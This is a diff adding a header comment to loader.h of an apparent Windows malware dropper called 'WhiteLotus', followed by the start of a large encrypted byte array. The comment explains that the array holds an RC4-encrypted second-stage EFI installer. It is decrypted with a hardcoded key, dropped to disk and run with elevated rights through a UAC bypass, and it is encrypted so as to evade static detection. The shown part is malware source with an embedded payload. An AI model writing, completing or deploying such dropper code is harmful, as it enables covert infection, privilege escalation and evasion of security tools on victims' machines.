@@ -1,3 +1,28 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows User-Mode Dropper
+ *  File     : loader.h
+ * ============================================================
+ *
+ *  Description:
+ *    RC4-encrypted binary payload of the EFI installer
+ *    (loadefi.exe), embedded as a C byte array. Decrypted
+ *    at runtime in main.c using the hardcoded key before
+ *    being written to disk and launched with elevated
+ *    privileges via the UAC bypass.
+ *
+ *  Purpose:
+ *    - Bundle the second-stage EFI installer as encrypted
+ *      data inside the dropper binary to avoid static
+ *      detection of the plaintext PE image.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 unsigned char LoaderPayload[116224] = {
  0x22, 0xFA, 0x20, 0x33, 0x1E, 0x27, 0xB2, 0xEA, 0x6D, 0x33, 0x53, 0x32,
  0xFC, 0x9E, 0xF8, 0x1A, 0x95, 0xA6, 0x7F, 0x5F, 0x9D, 0x69, 0x45, 0xD1,
